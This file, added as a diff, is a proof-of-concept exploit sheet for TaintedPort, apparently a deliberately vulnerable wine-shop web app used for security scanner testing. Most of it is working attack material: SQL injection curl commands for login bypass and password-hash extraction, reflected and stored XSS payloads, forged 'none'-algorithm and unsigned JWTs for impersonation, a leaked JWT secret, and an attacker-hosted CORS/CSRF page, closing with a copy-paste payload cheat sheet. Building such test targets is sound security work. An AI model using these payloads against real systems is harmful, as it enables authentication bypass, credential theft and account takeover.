@@ -1,0 +1,287 @@
+============================================================
+  TaintedPort - Vulnerability Proof of Concept (PoC)
+  Exploitation payloads for each known vulnerability.
+============================================================
+
+Default credentials: joe@example.com / password123
+Frontend: https://taintedport.com
+API:      https://api.taintedport.com
+Local:    http://localhost:8080 (frontend) / http://localhost:8080/api/ (API)
+
+
+=== 1. SQL Injection - Login Email ===
+CWE-89 | High | POST /auth/login
+
+Payload:
+  curl -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email": "'\'' OR 1=1 --", "password": "anything"}'
+
+How it works:
+  The email is concatenated into: SELECT * FROM users WHERE email = '<input>'
+  Injecting ' OR 1=1 -- makes the query:
+    SELECT * FROM users WHERE email = '' OR 1=1 --'
+  This returns the first user (joe@example.com), bypassing authentication.
+
+Extract all users:
+  curl -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email": "'\'' UNION SELECT 1,name,email,password_hash,5,6,7 FROM users--", "password": "x"}'
+
+
+=== 2. SQL Injection - Wine Detail (ID) ===
+CWE-89 | High | GET /wines/:id
+
+Payload (extract user credentials via UNION):
+  curl "https://api.taintedport.com/wines/1 UNION SELECT 1,email,password_hash,name,5,6,7,8,9,10,11,12 FROM users--"
+
+Payload (extract table names):
+  curl "https://api.taintedport.com/wines/1 UNION SELECT 1,name,3,4,5,6,7,8,9,10,11,12 FROM sqlite_master WHERE type='table'--"
+
+How it works:
+  The wine ID is concatenated into: SELECT * FROM wines WHERE id = <input>
+  The route accepts non-numeric values, so arbitrary SQL can be appended.
+
+
+=== 3. Reflected XSS - Login Email ===
+CWE-79 | Medium | POST /auth/login
+
+Payload:
+  curl -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email": "<img src=x onerror=alert(document.domain)>", "password": "wrong"}'
+
+How it works:
+  On failed login, the API responds with:
+    "Login failed for <img src=x onerror=alert(document.domain)>. Please check your credentials."
+  The frontend renders this error message using dangerouslySetInnerHTML,
+  causing the JavaScript in the onerror handler to execute.
+
+Browser test:
+  1. Go to https://taintedport.com/login
+  2. Enter email: <img src=x onerror=alert('XSS')>
+  3. Enter any password
+  4. Click Sign In
+  5. The alert fires in the error message area
+
+
+=== 4. Reflected XSS - Wine Search ===
+CWE-79 | Medium | GET /wines?search=<payload>
+
+Payload (API):
+  curl "https://api.taintedport.com/wines?search=<img+src=x+onerror=alert('XSS')>"
+
+Response includes:
+  "message": "Showing results for: <img src=x onerror=alert('XSS')>"
+
+Browser test:
+  1. Go to https://taintedport.com/wines
+  2. In the search box, type: <img src=x onerror=alert('XSS-search')>
+  3. Press Enter or wait for search
+  4. The alert fires below the page header
+
+
+=== 5. Stored XSS - User Name (Account Page / Navbar) ===
+CWE-79 | Medium | PUT /auth/profile
+
+Payload:
+  # First, login to get a token
+  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+
+  # Set name to XSS payload
+  curl -X PUT https://api.taintedport.com/auth/profile \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"name": "<img src=x onerror=alert(document.cookie)>"}'
+
+How it works:
+  The name is stored in the database without sanitization.
+  The Navbar renders "Hi, <name>" using dangerouslySetInnerHTML.
+  Every page the user visits will trigger the XSS payload.
+
+Browser test:
+  1. Log in at https://taintedport.com/login
+  2. Go to Account
+  3. Click the pencil icon next to your name
+  4. Change name to: <img src=x onerror=alert('stored-XSS')>
+  5. Save - the alert fires in the navbar on every page
+
+
+=== 6. Stored XSS - Shipping Name (Checkout / Order Detail) ===
+CWE-79 | Medium | POST /orders
+
+Payload:
+  # Login and get token (see #5 above)
+
+  # Add a wine to cart first
+  curl -X POST https://api.taintedport.com/cart/add \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"wine_id": 1, "quantity": 1}'
+
+  # Place order with XSS in shipping name
+  curl -X POST https://api.taintedport.com/orders \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{
+      "shipping_address": {
+        "name": "<img src=x onerror=alert(document.cookie)>",
+        "street": "123 Test St",
+        "city": "Lisboa",
+        "postal_code": "1000-001",
+        "phone": "+351999999999"
+      }
+    }'
+
+How it works:
+  The shipping name is stored in the orders table without sanitization.
+  The order detail page (/orders/:id) renders the shipping name using
+  dangerouslySetInnerHTML. Anyone viewing the order sees the XSS fire.
+
+Browser test:
+  1. Log in, add a wine to cart, go to Checkout
+  2. Set Full Name to: <img src=x onerror=alert('order-XSS')>
+  3. Fill in other fields, place order
+  4. Go to Account -> Order History -> View Details
+  5. The alert fires on the order detail page
+
+
+=== 7. JWT "none" Algorithm ===
+CWE-345 | High | Any authenticated endpoint
+
+Payload:
+  # Forge a token with alg=none (no signature needed)
+  # Header:  {"alg":"none","typ":"JWT"}  -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+  # Payload: {"user_id":1,"email":"joe@example.com","exp":9999999999}
+  #   -> eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0
+
+  TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0."
+
+  curl -H "Authorization: Bearer $TOKEN" https://api.taintedport.com/auth/me
+
+Expected result:
+  Returns joe@example.com's account data without knowing the JWT secret.
+
+Impersonate any user:
+  # Change user_id to target any user in the system
+  # Payload: {"user_id":2,"email":"other@example.com","exp":9999999999}
+  TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoyLCJlbWFpbCI6Im90aGVyQGV4YW1wbGUuY29tIiwiZXhwIjo5OTk5OTk5OTk5fQ."
+
+  curl -H "Authorization: Bearer $TOKEN" https://api.taintedport.com/auth/me
+
+
+=== 8. JWT Signature Not Verified ===
+CWE-347 | High | Any authenticated endpoint
+
+Payload:
+  # Take any valid JWT and modify the payload while keeping a garbage signature
+  # Header (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+  # Tampered payload (user_id changed to 1):
+  PAYLOAD=$(echo -n '{"user_id":1,"email":"joe@example.com","exp":9999999999}' | \
+    python3 -c "import sys,base64; print(base64.urlsafe_b64encode(sys.stdin.buffer.read()).rstrip(b'=').decode())")
+
+  TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${PAYLOAD}.INVALIDSIGNATURE"
+
+  curl -H "Authorization: Bearer $TOKEN" https://api.taintedport.com/auth/me
+
+How it works:
+  The JWT decode function compares the signature but only logs a warning
+  on mismatch - it does NOT reject the token. Any payload with any
+  signature (or garbage signature) is accepted as valid.
+
+
+=== 9. Directory Listing ===
+CWE-548 | Medium | /files/
+
+URLs:
+  https://taintedport.com/files/
+  https://api.taintedport.com/files/
+
+Sensitive files exposed:
+  /files/api/config/jwt.php        -> JWT secret key: pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI
+  /files/api/config/database.php   -> Database configuration
+  /files/api/config/totp.php       -> TOTP implementation
+  /files/database.db               -> Full SQLite database (user credentials, orders, etc.)
+  /files/api/controllers/          -> All controller source code
+  /files/api/models/               -> All model source code
+  /files/api/middleware/            -> Auth middleware source code
+  /files/setup_db.php              -> Database schema and seed data
+
+Exploit:
+  # Download the entire database
+  curl -o database.db https://taintedport.com/files/database.db
+
+  # Read the JWT secret
+  curl https://taintedport.com/files/api/config/jwt.php
+
+  # Now you can forge valid HS256 tokens using the leaked secret
+
+
+=== 10. CSRF on Checkout ===
+CWE-352 | Medium | POST /orders
+
+CORS misconfiguration:
+  The API reflects any Origin header in Access-Control-Allow-Origin with
+  Access-Control-Allow-Credentials: true. This allows any website to make
+  authenticated cross-origin requests.
+
+  curl -v -H "Origin: https://evil.com" https://api.taintedport.com/wines
+  # Response includes: Access-Control-Allow-Origin: https://evil.com
+
+PoC (host on attacker-controlled domain):
+  <html>
+  <body>
+  <h1>Congratulations! You won a free wine tasting!</h1>
+  <p>Click the button to claim your prize...</p>
+  <button onclick="exploit()">Claim Prize</button>
+  <script>
+  function exploit() {
+    // The permissive CORS allows this cross-origin request
+    // Combined with XSS (vuln #5), an attacker can steal the JWT from localStorage
+    // and use it to place orders on behalf of the victim
+    var token = ''; // Obtained via XSS: localStorage.getItem('token')
+
+    fetch('https://api.taintedport.com/orders', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + token
+      },
+      body: JSON.stringify({
+        shipping_address: {
+          name: 'Attacker',
+          street: '123 Evil Street',
+          city: 'Hackville',
+          postal_code: '00000',
+          phone: '000000000'
+        },
+        delivery_notes: 'Placed via CSRF'
+      })
+    }).then(r => r.json()).then(d => console.log('Order placed:', d));
+  }
+  </script>
+  </body>
+  </html>
+
+Note:
+  Since authentication uses JWT tokens in localStorage (not cookies),
+  pure CSRF requires combining with an XSS vulnerability to steal the
+  token first. However, the permissive CORS policy itself is the core
+  misconfiguration that DAST scanners will flag.
+
+
+============================================================
+  CHEAT SHEET - Quick Copy-Paste Payloads
+============================================================
+
+SQLi login bypass:       ' OR 1=1 --
+SQLi wine UNION:         1 UNION SELECT 1,email,password_hash,name,5,6,7,8,9,10,11,12 FROM users--
+XSS login email:         <img src=x onerror=alert('XSS')>
+XSS wine search:         <img src=x onerror=alert('XSS')>
+XSS stored name:         <img src=x onerror=alert('XSS')>
+XSS stored order:        <img src=x onerror=alert('XSS')>
+JWT none token:          eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0.
+Directory listing:       /files/
+JWT secret (from dir):   pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI
